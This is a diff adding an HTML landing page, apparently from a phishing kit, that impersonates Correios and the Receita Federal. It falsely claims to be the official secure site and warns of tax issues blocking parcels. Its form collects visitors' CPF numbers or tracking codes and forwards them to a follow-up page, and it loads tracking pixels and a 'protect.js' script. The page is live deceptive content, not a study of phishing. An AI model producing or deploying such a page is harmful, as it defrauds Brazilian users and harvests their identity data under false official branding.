@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <script src="assets/js/protect.js?v=20260814clear"></script>
+  <script src="assets/js/pixel-loader-utmify.js"></script>
+  <script src="assets/js/pixel-utmify.js"></script>
+  <meta name="theme-color" content="#003366">
+  <meta name="description" content="Portal Oficial de Consulta Fiscal - Rastreamento de Encomendas">
+  <title>Rastreamento de Encomendas | Consulta Fiscal</title>
+  <link rel="stylesheet" href="assets/css/correios-mobile.css?v=20260814f">
+</head>
+<body>
+  <div class="page page-landing">
+    <header class="landing-header">
+      <img src="assets/img/logo-correios-header.png" alt="Correios" class="landing-logo-full">
+    </header>
+
+    <div class="landing-ssl">
+      <svg class="landing-ssl-lock" viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path fill="#003399" d="M18 8h-1V6a5 5 0 00-10 0v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zm-3 0H9V6a3 3 0 016 0v2z"/></svg>
+      <span class="landing-ssl-text">Conexão Segura SSL • Site Oficial dos Correios</span>
+      <svg class="landing-ssl-check" viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path fill="#003399" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+    </div>
+
+    <div class="landing-rf-wrap">
+      <div class="landing-rf-bar">
+        <div class="landing-rf-left">
+          <img src="assets/img/logo-rf-header.png" alt="Receita Federal" class="landing-rf-logo">
+          <span>Receita Federal</span>
+        </div>
+        <div class="landing-rf-right">
+          <strong>Sistema Integrado</strong>
+          <p class="landing-rf-status">
+            <span class="landing-dot" aria-hidden="true"></span>
+            Online • Seguro
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <main class="landing-main">
+      <h1 class="landing-title">Rastreamento de Encomendas</h1>
+      <p class="landing-subtitle">Portal Oficial de Consulta Fiscal</p>
+
+      <div class="landing-card">
+        <div class="landing-card-default" id="landingDefault">
+          <div class="landing-alert">
+            <span class="landing-alert-icon">i</span>
+            <div class="landing-alert-text">
+              <strong>AVISO IMPORTANTE</strong>
+              <p>Verifique se há pendências fiscais vinculadas ao seu CPF que possam impactar a liberação de suas encomendas.</p>
+            </div>
+          </div>
+
+          <p class="landing-instruction">
+            Para consultar suas encomendas e verificar pendências fiscais, clique no botão abaixo e informe seu CPF.
+          </p>
+
+          <button type="button" class="landing-btn" id="btnAbrirConsulta">
+            <svg viewBox="0 0 24 24" width="15" height="15" aria-hidden="true"><path fill="#fff" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            CONSULTAR ENCOMENDAS AGORA
+          </button>
+        </div>
+
+        <div class="landing-consult is-hidden" id="landingConsult" aria-hidden="true">
+          <div class="landing-consult-inner">
+            <div class="landing-consult-head">
+              <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="none" stroke="#003366" stroke-width="1.6" d="M4 8.5 12 4.5l8 4v8.5l-8 4-8-4V8.5z"/><path fill="none" stroke="#003366" stroke-width="1.6" d="M12 13v8"/><path fill="none" stroke="#003366" stroke-width="1.6" d="m4 8.5 8 4.5 8-4.5"/></svg>
+              <span>Deseja acompanhar seu objeto?</span>
+            </div>
+
+            <form class="landing-consult-form" id="formConsulta" onsubmit="return enviarConsultaLanding()">
+              <label for="consultaInput">Digite seu CPF ou código de rastreamento:</label>
+              <input
+                type="text"
+                id="consultaInput"
+                name="consulta"
+                placeholder="AA123456789BR ou 000.111.222-33"
+                autocomplete="off"
+                maxlength="17"
+                spellcheck="false"
+                required
+                oninput="mascararConsultaLanding(this)"
+              >
+              <button type="submit" class="landing-consult-btn">
+                <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="#fff" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                CONSULTAR
+              </button>
+            </form>
+
+            <div class="landing-consult-trust">
+              <p>
+                <svg viewBox="0 0 24 24" width="12" height="12" aria-hidden="true"><path fill="#003366" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                Dados protegidos por criptografia SSL
+              </p>
+              <p>
+                <svg viewBox="0 0 24 24" width="12" height="12" aria-hidden="true"><path fill="#003366" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                Consulta oficial integrada aos Correios
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="landing-features">
+        <article class="landing-feature landing-feature-blue">
+          <div class="landing-feature-icon">
+            <img src="assets/img/icon-truck.svg?v=3" alt="">
+          </div>
+          <h3>Rastreamento</h3>
+          <p>Consulte o status da sua encomenda em tempo real</p>
+        </article>
+        <article class="landing-feature landing-feature-green">
+          <div class="landing-feature-icon">
+            <img src="assets/img/icon-shield.svg" alt="">
+          </div>
+          <h3>Segurança</h3>
+          <p>Dados protegidos pela Receita Federal</p>
+        </article>
+        <article class="landing-feature landing-feature-yellow">
+          <div class="landing-feature-icon">
+            <img src="assets/img/icon-document.svg" alt="">
+          </div>
+          <h3>Regularização</h3>
+          <p>Pendências devem ser regularizadas para liberação</p>
+        </article>
+      </div>
+    </main>
+
+    <footer class="landing-footer">
+      <img src="assets/img/rodape2.png" alt="Correios - Governo Federal">
+    </footer>
+  </div>
+  <script>
+    (function () {
+      var btn = document.getElementById("btnAbrirConsulta");
+      var defaultView = document.getElementById("landingDefault");
+      var consultView = document.getElementById("landingConsult");
+      var input = document.getElementById("consultaInput");
+
+      btn.addEventListener("click", function () {
+        defaultView.classList.add("is-hidden");
+        consultView.classList.remove("is-hidden");
+        consultView.setAttribute("aria-hidden", "false");
+        input.focus();
+      });
+    })();
+
+    function formatarCodigoRastreio(valor) {
+      var codigo = "";
+      var i;
+
+      for (i = 0; i < valor.length && codigo.length < 13; i++) {
+        var ch = valor.charAt(i);
+
+        if (codigo.length < 2) {
+          if (/[A-Z]/.test(ch)) codigo += ch;
+        } else if (codigo.length < 11) {
+          if (/[0-9]/.test(ch)) codigo += ch;
+        } else if (codigo.length < 13) {
+          if (/[A-Z]/.test(ch)) codigo += ch;
+        }
+      }
+
+      var formatado = "";
+      for (i = 0; i < codigo.length; i++) {
+        if (i === 2 || i === 5 || i === 8 || i === 11) formatado += " ";
+        formatado += codigo.charAt(i);
+      }
+
+      return formatado;
+    }
+
+    function mascararConsultaLanding(campo) {
+      var bruto = campo.value.replace(/[^a-zA-Z0-9]/g, "").toUpperCase();
+
+      if (bruto.length === 0) {
+        campo.value = "";
+        return;
+      }
+
+      if (/^[A-Z]/.test(bruto.charAt(0))) {
+        campo.value = formatarCodigoRastreio(bruto);
+        return;
+      }
+
+      var cpf = bruto.replace(/\D/g, "");
+      if (cpf.length > 11) cpf = cpf.slice(0, 11);
+      cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+      cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+      cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+      campo.value = cpf;
+    }
+
+    function buildRedirectUrl(path, updates) {
+      var nextParams = new URLSearchParams(window.location.search);
+      Object.keys(updates).forEach(function (key) {
+        var value = updates[key];
+        if (value === null || value === undefined || value === "") {
+          nextParams.delete(key);
+          return;
+        }
+        nextParams.set(key, value);
+      });
+      var query = nextParams.toString();
+      return path + (query ? "?" + query : "");
+    }
+
+    function enviarConsultaLanding() {
+      var valor = document.getElementById("consultaInput").value.trim().toUpperCase();
+      var codigo = valor.replace(/[^A-Z0-9]/g, "");
+
+      if (/^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(codigo)) {
+        window.location.href = buildRedirectUrl("index2.html", { codigo: codigo, cpf: null });
+        return false;
+      }
+
+      var cpf = valor.replace(/\D/g, "");
+      if (cpf.length === 11) {
+        window.location.href = buildRedirectUrl("index2.html", { cpf: cpf, codigo: null });
+        return false;
+      }
+
+      alert("Informe um CPF válido ou código de rastreamento no formato AA123456789BR (2 letras, 9 números e 2 letras).");
+      return false;
+    }
+  </script>
+</body>
+</html>
